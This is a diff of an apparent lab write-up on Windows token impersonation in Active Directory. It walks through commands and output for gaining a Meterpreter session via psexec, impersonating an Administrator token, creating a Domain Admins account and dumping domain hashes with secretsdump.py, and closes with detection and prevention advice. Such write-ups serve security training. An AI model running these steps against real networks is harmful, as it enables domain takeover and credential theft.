@@ -1,80 +1,139 @@
 # Token Impersonation Attack
 
-**Date:** June 2026  
-**Author:** ShahinSecLab  
-**Category:** Privilege Escalation  
-**Difficulty:** Easy  
+**Date:** June 2026 <br> 
+**Author:** ShahinSecLab <br> 
+**Category:** Privilege Escalation <br> 
+**Difficulty:** Easy <br> 
 **Tools:** Metasploit Framework, PsExec, Meterpreter, Incognito, secretsdump.py
 
 ## Table of Contents
 
-- [Introduction](#introduction)
-- [Lab Setup](#lab-setup)
-- [Attack Flow](#attack-flow)
-- [Step 1 - Get a Meterpreter Session](#step-1---get-a-meterpreter-session)
-  - [1.1 Start Metasploit](#11-start-metasploit)
-  - [1.2 Search for PsExec](#12-search-for-psexec)
-  - [1.3 Use PsExec Module](#13-use-psexec-module)
-  - [1.4 View Module Options](#14-view-module-options)
-  - [1.5 Setting Required Options](#15-setting-required-options)
-  - [1.6 Get Meterpreter Session](#16-get-meterpreter-session)
-- [Step 2 - Check UID](#step-2---check-uid)
-- [Step 3 - Load Incognito](#step-3---load-incognito)
-- [Step 4 - List Available Tokens](#step-4---list-available-tokens)
-- [Step 5 - Impersonate the Administrator Token](#step-5---impersonate-the-administrator-token)
-- [Step 6 - Verify Access](#step-6---verify-access)
-- [Step 7 - Add New User](#step-7---add-new-user)
-  - [Step 7.1 - Create a Domain User](#step-71---create-a-domain-user)
-  - [Step 7.2 - Add a User to the Domain Admins Group](#step-72---add-a-user-to-the-domain-admins-group)
-- [Step 8 - Dump All Hashes](#step-8---dump-all-hashes)
-- [Key Takeaways](#key-takeaways)
-- [Mitigation](#mitigation)
-- [References](#references)
+* [Introduction](#introduction)
+* [Attack Flow](#attack-flow)
+* [Why This Attack Works](#why-this-attack-works)
+* [Lab Setup](#lab-setup)
+* [Tools Used](#tools-used)
+* [Prerequisites](#prerequisites)
+* [Step 1 - Getting a Meterpreter Session](#step-1---getting-a-meterpreter-session)
+  * [Step 1.1 - Starting Metasploit](#11-starting-metasploit)
+  * [Step 1.2 - Searching for PsExec](#12-searching-for-psexec)
+  * [Step 1.3 - Using PsExec Module](#13-using-psexec-module)
+  * [Step 1.4 - Viewing Module Options](#14-viewing-module-options)
+  * [Step 1.5 - Setting Required Options](#15-setting-required-options)
+  * [Step 1.6 - Getting Meterpreter Session](#16-getting-meterpreter-session)
+* [Step 2 - Checking UID](#step-2---checking-uid)
+* [Step 3 - Loading Incognito](#step-3---loading-incognito)
+* [Step 4 - Listing Available Tokens](#step-4---listing-available-tokens)
+* [Step 5 - Impersonating the Administrator Token](#step-5---impersonating-the-administrator-token)
+* [Step 6 - Verifying Access](#step-6---verifying-access)
+* [Step 7 - Adding New User](#step-7---adding-new-user)
+  * [Step 7.1 - Creating a Domain User](#step-71---creating-a-domain-user)
+  * [Step 7.2 - Adding a User to the Domain Admins Group](#step-72---adding-a-user-to-the-domain-admins-group)
+* [Step 8 - Dumping All Hashes](#step-8---dumping-all-hashes)
+* [How Defenders Can Catch This](#how-defenders-can-catch-this)
+* [How to Prevent It](#how-to-prevent-it)
+* [References](#references)
+* [Lessons Learned](#lessons-learned)
 
 ## Introduction
 
 In this lab, I practiced a Windows Token Impersonation attack.
-Windows creates an access token whenever a user logs in. The token contains information about that user's permissions and privileges.
-If a privileged token is available on a compromised machine, it may be possible to impersonate that token and perform actions as that user.
-The goal of this lab was to identify available tokens and impersonate a privileged account from an existing Meterpreter session.
+
+Windows creates an access token whenever a user logs into the system. This token contains information about the user's identity, permissions, and privileges. Windows uses this token to decide what actions a user is allowed to perform.
+
+If a privileged user's token is available on a compromised machine, it may be possible to impersonate that token and perform actions with that user's privileges without knowing the password.
+
+The goal of this lab was to obtain a Meterpreter session, find available tokens, impersonate a privileged account token, and verify the level of access gained.
+
+## Attack Flow
+```
+Valid Domain Credentials  
+              ↓  
+Use Metasploit PsExec Module  
+              ↓  
+Authenticate to the Target via SMB  
+              ↓  
+Gain a Meterpreter Session (NT AUTHORITY\SYSTEM)  
+              ↓  
+Load Incognito Extension  
+              ↓  
+Enumerate Available Access Tokens  
+              ↓  
+Impersonate the Administrator Token  
+              ↓  
+Verify Administrator Privileges (`getuid`)  
+              ↓  
+Open a System Shell  
+              ↓  
+Create a New Domain User  
+              ↓  
+Add the User to the Domain Admins Group  
+              ↓  
+Authenticate as the New Domain Admin  
+              ↓  
+Dump NTDS Hashes with `secretsdump.py`  
+              ↓  
+Complete Domain Compromise
+```
+## Why This Attack Works
+
+Windows uses access tokens to decide what a user can and cannot do on a system. When a user logs in, Windows creates an access token that contains information about the user's identity, permissions, and privileges.
+
+This attack works because Windows allows users and processes to use existing access tokens during normal operations. If a privileged user's token is available in the current session, it may be possible to use that token and act as that user.
+
+In this lab, the Administrator account token was available because the Administrator user had an active session on the target machine. By impersonating that token, I was able to run commands with Administrator privileges.
+
+After gaining Administrator access, I was able to create a new domain user, add the user to the Domain Admins group, and access sensitive information from the domain controller.
+
+This attack is possible when:
+- A privileged user has an active session on the machine.
+- Token impersonation privileges are available.
+- Privileged accounts are not properly protected.
+
+To reduce the risk, organizations should limit the use of privileged accounts, avoid unnecessary administrator sessions, and monitor unusual account activity.
 
 ## Lab Setup
 
-```
 | Machine             | Role              |   Ip          |
 | ------------------- | ----------------- |---------------|
-| Kali Linux          | Attacker          | 192.168.5.128 |
-| Windows 10          | Victim            | 192.168.5.142 |
-| Windows Server 2019 | Domain Controller | 192.168.5.134 |
-```
+| Kali Linux          | Attacker          | `192.168.5.128` |
+| Windows 10          | Victim            | `192.168.5.142` |
+| Windows Server 2019 | Domain Controller | `192.168.5.134` |
 
-Before starting the attack, I already had the following valid domain credentials:
+## Tools Used
 
-- Domain: `readteambd.local`
-- User: `rahimkhan`
-- Pass: `Password1`
+| Tool | Purpose |
+| ---- | ------- |
+| Metasploit Framework | Used to create a Meterpreter session through PsExec |
+| PsExec Module | Used to authenticate to the Windows machine using valid credentials |
+| Meterpreter | Used to interact with the compromised Windows system |
+| Incognito | Used to list and impersonate available access tokens |
+| `secretsdump.py` | Used to dump domain hashes from the Domain Controller |
 
-## Attack Flow
+## Prerequisites
 
-```
-Gain Initial Access
-        │
-        ▼
-List Available Tokens
-        │
-        ▼
-Find Administrator Token
-        │
-        ▼
-Impersonate Token
-        │
-        ▼
-Gain Elevated Privileges
-```
+| What | Why |
+|-------------------------------|----------------------------------------------|
+| Kali Linux machine | Attacker machine with penetration testing tools installed |
+| Windows domain environment | Required for testing Active Directory token impersonation |
+| Target Windows machine | System where the Meterpreter session is obtained |
+| Domain Controller | Required for managing domain users and testing domain access |
+| Valid domain credentials | Required to authenticate to the target system |
+| Network connectivity | Required for communication between Kali Linux, Windows machine, and Domain Controller |
+| Authorization to test the environment | Ensures the assessment is performed legally |
 
-## Step 1 - Get a Meterpreter Session
+Before starting the attack, I already had valid domain credentials:
 
-### 1.1 Start Metasploit
+| What | Value |
+|------|----------------|
+| Domain | `readteambd.local` |
+| Username | `rahimkhan` |
+| Password | `Password1` |
+
+
+## Step 1 - Getting a Meterpreter Session
+
+### Step 1.1 - Starting Metasploit
 
 First, I started the Metasploit Framework in quiet mode.
 
@@ -82,11 +141,13 @@ First, I started the Metasploit Framework in quiet mode.
 msfconsole -q
 ```
 
-**Breakdown:**
+**Flag Breakdown:**
 
-* `msfconsole` starts the Metasploit Framework console.
-* The `-q` flag starts Metasploit in quiet mode.
-* This hides the startup banner and extra messages, giving a cleaner terminal output.
+| Flag | Description |
+|----------------|-------------|
+| `msfconsole` | Starts the Metasploit Framework console |
+| `-q` | Starts Metasploit in quiet mode |
+| Quiet mode | Hides the startup banner and extra messages, giving a cleaner terminal output |
 
 **Output:**
 
@@ -99,14 +160,13 @@ msf6 >
 
 The quiet mode does not change how Metasploit works. It only reduces the amount of information displayed when the console starts.
 
-### 1.2 Search for PsExec
+### Step 1.2 - Searching for PsExec
 
 Next, I searched for the available PsExec modules.
 
 ```bash
 search psexec
 ```
-
 The output shows several modules related to PsExec. For this lab, I used `exploit/windows/smb/psexec.`
 
 **Output:**
@@ -161,7 +221,7 @@ Matching Modules
   <img src="/Active-Directory/05-token impersonation attack/images/step1 1.2.png" width="600">
 </p>
 
-### 1.3 Use PsExec Module
+### Step 1.3 - Using PsExec Module
 
 I selected the exploit/windows/smb/psexec module to get a Meterpreter session on the target machine.
 
@@ -184,7 +244,7 @@ msf exploit(windows/smb/psexec) >
 
 This module uses valid Windows credentials to execute a payload over SMB and open a Meterpreter session on the target.
 
-### 1.4 View Module Options
+### Step 1.4 - Viewing Module Options
 
 Next, I checked the module options to see which settings needed to be configured.
 
@@ -238,7 +298,7 @@ View the full module info with the info, or info -d command.
   <img src="/Active-Directory/05-token impersonation attack/images/step1 1.4.png" width="600">
 </p>
 
-### 1.5 Setting Required Options
+### Step 1.5 - Setting Required Options
 
 Before running the exploit, I set the target machine and login details in Metasploit.
 
@@ -276,7 +336,7 @@ msf exploit(windows/smb/psexec) >
   <img src="/Active-Directory/05-token impersonation attack/images/step1 1.5.png" width="600">
 </p>
 
-### 1.6 Get Meterpreter Session
+### Step 1.6 - Getting Meterpreter Session
 
 After setting everything, I ran the exploit to get a session on the target machine.
 
@@ -305,8 +365,7 @@ After this, I successfully got a Meterpreter session on the target system.
   <img src="/Active-Directory/05-token impersonation attack/images/step1 1.6.png" width="600">
 </p>
 
-
-## Step 2 - Check UID
+## Step 2 - Checking UID
 
 After getting a Meterpreter session on the Windows machine, I checked which user I was running as.
 
@@ -326,7 +385,7 @@ This shows that I already had SYSTEM-level access on the target machine.
   <img src="/Active-Directory/05-token impersonation attack/images/step2-1.png" width="600">
 </p>
 
-## Step 3 - Load Incognito
+## Step 3 - Loading Incognito
 
 After getting a Meterpreter session on the target machine in my lab, I loaded the Incognito module to work with access tokens.
 
@@ -342,7 +401,7 @@ Loading extension incognito...Success.
 ```
 This confirms that the Incognito extension was loaded successfully and is ready to use for token listing and impersonation.
 
-## Step 4 - List Available Tokens
+## Step 4 - Listing Available Tokens
 
 After loading Incognito, I listed all available user tokens on the system in my lab.
 
@@ -376,7 +435,7 @@ From the list, I could see multiple delegation tokens, including the Administrat
   <img src="/Active-Directory/05-token impersonation attack/images/step4.png" width="600">
 </p>
 
-## Step 5 - Impersonate the Administrator Token
+## Step 5 - Impersonating the Administrator Token
 
 From the available tokens, I selected the Administrator token and impersonated it in my lab session.
 
@@ -391,8 +450,7 @@ meterpreter > impersonate_token READTEAMBD\\Administrator
 [+] Delegation token available
 [+] Successfully impersonated user READTEAMBD\Administrator
 ```
-
-## Step 6 - Verify Access
+## Step 6 - Verifying Access
 
 After impersonating the token, I checked the current user again to confirm the change.
 
@@ -406,17 +464,15 @@ getuid
 meterpreter > getuid
 Server username: READTEAMBD\administrator
 ```
-
 At this point, the session was running with Administrator-level privileges on the target machine in my lab.
 
-## Step 7 - Add new user
+## Step 7 - Adding New User
 
 After getting Administrator access in my lab session, I opened a system shell to run Windows commands.
 
 ```bash
 shell
 ```
-
 **Output:**
 
 ```text
@@ -429,21 +485,22 @@ Microsoft Windows [Version 10.0.19045.2965]
 C:\Windows\system32>
 ```
 
-### Step 7.1 - Create a Domain User
+### Step 7.1 - Creating a Domain User
 
 After opening a system shell in my lab session, I created a new domain user named `test` with the password `@shahin123#!`:
 
 ```bash
 net user test @shahin123#! /add /domain
 ```
+**Flag Breakdown**
 
-### Command Breakdown
-
-- `net user` – Used to manage user accounts in Windows.
-- `test` – The username of the new account.
-- `@shahin123#!` – The password assigned to the account.
-- `/add` – Creates a new user account.
-- `/domain` – Performs the action on the Active Directory domain instead of the local machine.
+| Command/Option | Description |
+|----------------|-------------|
+| `net user` | Used to manage user accounts in Windows |
+| `test` | The username of the new account |
+| `@shahin123#!` | The password assigned to the account |
+| `/add` | Creates a new user account |
+| `/domain` | Performs the action on the Active Directory domain instead of the local machine |
 
 **Output:**
 
@@ -461,21 +518,22 @@ This confirms that a new domain user was created successfully in my lab environm
   <img src="/Active-Directory/05-token impersonation attack/images/step7.1.png" width="600">
 </p>
 
-## Step 7.2 - Add a User to the Domain Admins Group
+## Step 7.2 - Adding a User to the Domain Admins Group
 
 After creating the user in my lab, I tried to add that user to the `Domain Admins` group.
 
 ```bash
 net group "Domain Admins" test /ADD /DOMAIN
 ```
+**Flag Breakdown**
 
-### Command Breakdown
-
-- `net` – Windows built-in CLI tool for managing network/domain resources.
-- `group` – Specifies you're working with a global group (domain-level group).
-- `Domain Admins` – The target group name (quotes needed because of the space).
-- `test` – The username being added to the group.
-- `/ADD` – The action — adds the user to the group.
+| Command/Option | Description |
+|----------------|-------------|
+| `net` | Windows built-in CLI tool for managing network and domain resources |
+| `group` | Specifies that the command is working with a domain-level group |
+| `Domain Admins` | The target group name (quotes are required because of the space) |
+| `test` | The username being added to the group |
+| `/ADD` | Adds the user to the specified group |
 
 **Output:**
 
@@ -489,21 +547,22 @@ The command completed successfully.
 
 This confirms the user test was added to the Domain Admins group in my lab environment.
 
-## Step 8 - Dump All Hashes
+## Step 8 - Dumping All Hashes
 
 After creating the new domain user and adding it to the Domain Admins group in my lab, I used that account to dump all hashes from the domain controller.
 
 ```bash
 secretsdump.py readteambd.local/test:'@shahin123#!'@192.168.5.134
 ```
+**Flag Breakdown**
 
-### Command Breakdown
-
-- `secretsdump.py` – Impacket script that remotely dumps password hashes and secrets from a Windows/AD target.
-- `readteambd.local` – Domain
-- `test` - user name
-- `@shahin123#!` - user password
-- `@192.168.5.134` - dc ip
+| Command/Option | Description |
+|----------------|-------------|
+| `secretsdump.py` | Impacket script used to dump password hashes and secrets from a Windows/Active Directory target |
+| `readteambd.local` | The target domain name |
+| `test` | The username used for authentication |
+| `@shahin123#!` | The password of the user account |
+| `@192.168.5.134` | The IP address of the Domain Controller |
 
 **Output:**
 
@@ -584,43 +643,45 @@ Finally, I was able to dump all hashes successfully.
   <img src="/Active-Directory/05-token impersonation attack/images/step8.png" width="600">
 </p>
 
+## How Defenders Can Catch This
 
-# Key Takeaways
+| Indicator | What to look for |
+|-------------------------------|----------------------------------------------|
+| Unusual token impersonation activity | Monitor processes using privileged user tokens |
+| Suspicious use of privileged accounts | Check for unexpected administrator activity |
+| New users added to Domain Admins group | Monitor changes to privileged groups |
+| Unexpected account creation | Review newly created domain accounts |
+| Suspicious access to Domain Controller | Monitor unusual authentication attempts |
+| Meterpreter or remote management activity | Check for unknown remote sessions and tools |
 
-- Windows creates an access token when a user logs in.
-- Access tokens contain the user's permissions.
-- A privileged token can sometimes be reused without knowing the user's password.
-- Token impersonation is a common post-exploitation technique.
-- Monitoring privileged activity can help detect this behavior.
+## How to Prevent It
 
-# Mitigation
-
-- Follow the principle of least privilege
-- Limit use of privileged accounts
-- Review accounts with SeImpersonatePrivilege
-- Enable Credential Guard
-- Monitor suspicious process activity
+- Follow the principle of least privilege.
+- Limit the number of users with administrator access.
+- Avoid using privileged accounts on normal user machines.
+- Disable unnecessary privileges that allow token impersonation.
+- Monitor and review members of the Domain Admins group.
+- Enable security monitoring for suspicious account changes.
+- Use Credential Guard where possible to protect sensitive credentials.
 
 # References
 
-### MITRE ATT&CK
+| Category | Resource | Link |
+|-------------------------------|--------------------------------|----------------------------------------------|
+| MITRE ATT&CK | Access Token Manipulation (T1134) | https://attack.mitre.org/techniques/T1134/ |
+| Microsoft Documentation | Access Tokens Documentation | https://learn.microsoft.com/en-us/windows/win32/secauthz/access-tokens |
+| Microsoft Documentation | Windows Privileges Documentation | https://learn.microsoft.com/en-us/windows/win32/secauthz/privileges |
+| Microsoft Documentation | Credential Guard Documentation | https://learn.microsoft.com/en-us/windows/security/identity-protection/credential-guard/ |
+| Security Documentation | Security Auditing Overview | https://learn.microsoft.com/en-us/windows/security/threat-protection/auditing/security-auditing-overview |
+| Tools Documentation | Metasploit Framework | https://www.metasploit.com/ |
+| Tools Documentation | Meterpreter Documentation | https://docs.metasploit.com/docs/using-metasploit/advanced/meterpreter/ |
+| Tools Documentation | Impacket Documentation | https://github.com/fortra/impacket |
 
-- [Access Token Manipulation (T1134)](https://attack.mitre.org/techniques/T1134/)
+## Lessons Learned
 
-### Microsoft Documentation
+- Windows uses access tokens to control user permissions and privileges.
+- A privileged user's token can be reused if it is available in the current session.
+- Token impersonation can allow a lower-level session to perform actions with higher privileges.
+- Active sessions of privileged users can increase the risk of token-based attacks.
+- Protecting administrator accounts and monitoring privileged activity can help reduce the impact of this attack.
 
-- [Access Tokens Documentation](https://learn.microsoft.com/en-us/windows/win32/secauthz/access-tokens)
-
-- [Credential Guard Documentation](https://learn.microsoft.com/en-us/windows/security/identity-protection/credential-guard/)
-
-### Additional Resources
-
-- [Windows Privileges Documentation](https://learn.microsoft.com/en-us/windows/win32/secauthz/privileges)
-
-- [Security Auditing Overview](https://learn.microsoft.com/en-us/windows/security/threat-protection/auditing/security-auditing-overview)
-
-### Tools Used During Testing
-
-- [Metasploit Framework](https://www.metasploit.com/)
-
-- [Meterpreter Documentation](https://docs.metasploit.com/docs/using-metasploit/advanced/meterpreter/)
